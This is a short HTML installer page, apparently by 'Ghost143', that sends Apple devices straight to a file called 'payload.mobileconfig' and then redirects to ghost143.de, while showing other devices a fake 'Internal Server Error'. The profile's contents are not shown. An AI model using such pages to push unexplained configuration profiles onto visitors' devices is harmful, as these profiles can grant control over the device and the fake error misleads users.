<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Install APP</title>
<script>
window.onload = function() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    var currentYear = new Date().getFullYear();

    console.log("[DEBUG] User Agent: " + userAgent); // Logging

    // iDevice Check
    if (/iPad|iPhone|Macintosh/.test(userAgent) && !window.MSStream) {
        window.location.href = "payload.mobileconfig";
        
        setTimeout(function() {
            window.location.href = "https://ghost143.de";
        }, 10000);
    } else {
        document.body.innerHTML = `
            <h1>Internal Server Error</h1>
            <p>Your device is currently not supported. This App can only be installed on an iDevice.</p>
            <footer style="margin-top: 20px; font-size: 0.8em; color: black;">
                &copy; ${currentYear} Ghost143
            </footer>
        `;
    }
}
</script>
</head>
<body>

</body>
</html>
